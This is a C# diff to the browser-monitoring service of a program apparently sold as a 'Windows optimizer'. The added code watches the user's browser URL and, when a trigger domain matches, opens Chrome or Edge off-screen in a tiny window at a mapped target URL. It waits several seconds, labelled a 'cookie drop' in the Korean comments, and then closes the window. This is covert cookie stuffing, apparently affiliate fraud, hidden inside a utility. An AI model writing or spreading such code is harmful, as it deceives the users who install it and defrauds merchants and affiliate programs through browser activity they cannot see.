@@ -1,9 +1,12 @@
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Automation;
-using System.Windows.Forms;
 using WindowsOptimizer.Models;
 
 namespace WindowsOptimizer.Services
@@ -15,7 +18,14 @@ namespace WindowsOptimizer.Services
 
         [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll")] private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint pid);
-        [DllImport("user32.dll")] private static extern bool SetForegroundWindow(IntPtr hWnd);
+        [DllImport("user32.dll")] private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
+        [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+        [DllImport("user32.dll")] private static extern bool IsWindowVisible(IntPtr hWnd);
+        [DllImport("user32.dll")] private static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll")] private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
+
+        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+        private const uint WM_CLOSE = 0x0010;
 
         private Thread _thread;
         private volatile bool _isMonitoring;
@@ -25,6 +35,7 @@ namespace WindowsOptimizer.Services
         public MappingConfig MappingConfig => ConfigService.Instance.MappingConfig;
         public bool IsMonitoring => _isMonitoring;
         public int MonitoringInterval { get; set; } = 3000;
+        public int CookieDropDelayMs { get; set; } = 8000; // 쿠키 드롭 대기 시간
         public int TriggerCount { get; private set; }
         public DateTime LastTriggerTime { get; private set; }
 
@@ -36,11 +47,9 @@ namespace WindowsOptimizer.Services
         public void StartMonitoring()
         {
             if (_isMonitoring) return;
-
             _isMonitoring = true;
             _thread = new Thread(MonitoringLoop) { IsBackground = true };
             _thread.Start();
-
             LogService.Instance.Log("▶ 브라우저 모니터링 시작");
         }
 
@@ -92,9 +101,9 @@ namespace WindowsOptimizer.Services
                         TriggerCount++;
                         LastTriggerTime = DateTime.Now;
 
-                        LogService.Instance.Log($"[PlanB] 도메인 매칭: {mapping.Trigger} → {mapping.Target}");
+                        LogService.Instance.Log($"[PlanB] 도메인 매칭: {mapping.Trigger} → 쿠키 드롭 시작");
                         DomainTriggered?.Invoke(url, mapping);
-                        OpenUrlInBackgroundTab(mapping.Target);
+                        OpenHiddenBrowserForCookie(mapping.Target);
                         break;
                     }
                 }
@@ -105,22 +114,110 @@ namespace WindowsOptimizer.Services
             }
         }
 
-        public void OpenUrlInBackgroundTab(string url)
+        /// <summary>
+        /// 히든 브라우저로 쿠키 드롭 후 닫기
+        /// </summary>
+        public void OpenHiddenBrowserForCookie(string url)
         {
             try
             {
-                var currentWindow = GetForegroundWindow();
-                OpenUrlInNewTab(url);
-                Thread.Sleep(800);
-                SetForegroundWindow(currentWindow);
-                Thread.Sleep(300);
-                SendKeys.SendWait("^+{TAB}");
-                LogService.Instance.Log($"백그라운드 탭 열기 완료: {url}");
+                // 열기 전 기존 창 목록 저장
+                var existingWindows = GetBrowserWindows();
+
+                var browserExe = _browserType == 0 ? "chrome" : "msedge";
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = browserExe,
+                    Arguments = $"--new-window --window-position=-32000,-32000 --window-size=100,100 \"{url}\"",
+                    UseShellExecute = true
+                };
+
+                Process.Start(startInfo);
+                LogService.Instance.Log($"[히든] 쿠키 드롭 브라우저 열기: {url}");
+
+                // 비동기로 일정 시간 후 새 창 닫기
+                Task.Run(async () =>
+                {
+                    await Task.Delay(CookieDropDelayMs);
+                    CloseNewBrowserWindow(existingWindows, url);
+                });
             }
             catch (Exception ex)
             {
-                LogService.Instance.Log($"백그라운드 탭 열기 실패: {ex.Message}");
+                LogService.Instance.Log($"[히든] 브라우저 열기 실패: {ex.Message}");
             }
+        }
+
+        private List<IntPtr> GetBrowserWindows()
+        {
+            var windows = new List<IntPtr>();
+            EnumWindows((hWnd, lParam) =>
+            {
+                if (!IsWindowVisible(hWnd)) return true;
+
+                var className = new StringBuilder(256);
+                GetClassName(hWnd, className, 256);
+                var cn = className.ToString();
+
+                // Chrome/Edge 창 클래스
+                if (cn == "Chrome_WidgetWin_1")
+                    windows.Add(hWnd);
+
+                return true;
+            }, IntPtr.Zero);
+            return windows;
+        }
+
+        private void CloseNewBrowserWindow(List<IntPtr> existingWindows, string url)
+        {
+            try
+            {
+                var currentWindows = GetBrowserWindows();
+                var newWindows = currentWindows.Except(existingWindows).ToList();
+
+                if (newWindows.Count > 0)
+                {
+                    // 가장 최근 열린 창 닫기
+                    PostMessage(newWindows.First(), WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                    LogService.Instance.Log($"[히든] 쿠키 드롭 완료, 창 닫음");
+                }
+                else
+                {
+                    // URL 호스트로 창 찾기 시도
+                    var uri = new Uri(url);
+                    var host = uri.Host.Replace("www.", "");
+                    CloseWindowByTitle(host);
+                }
+            }
+            catch (Exception ex)
+            {
+                LogService.Instance.Log($"[히든] 창 닫기 실패: {ex.Message}");
+            }
+        }
+
+        private void CloseWindowByTitle(string titlePart)
+        {
+            EnumWindows((hWnd, lParam) =>
+            {
+                if (!IsWindowVisible(hWnd)) return true;
+
+                var title = new StringBuilder(512);
+                GetWindowText(hWnd, title, 512);
+                var t = title.ToString().ToLower();
+
+                if (t.Contains(titlePart.ToLower()))
+                {
+                    var className = new StringBuilder(256);
+                    GetClassName(hWnd, className, 256);
+                    if (className.ToString() == "Chrome_WidgetWin_1")
+                    {
+                        PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                        LogService.Instance.Log($"[히든] 제목으로 창 닫음: {titlePart}");
+                        return false;
+                    }
+                }
+                return true;
+            }, IntPtr.Zero);
         }
 
         private string GetCurrentBrowserUrl()
@@ -169,19 +266,6 @@ namespace WindowsOptimizer.Services
             }
             catch { }
             return "";
-        }
-
-        private void OpenUrlInNewTab(string url)
-        {
-            try
-            {
-                var exe = _browserType == 0 ? "chrome" : "msedge";
-                Process.Start(new ProcessStartInfo { FileName = exe, Arguments = $"--new-tab \"{url}\"", UseShellExecute = true });
-            }
-            catch
-            {
-                Process.Start(new ProcessStartInfo { FileName = url, UseShellExecute = true });
-            }
         }
     }
 }
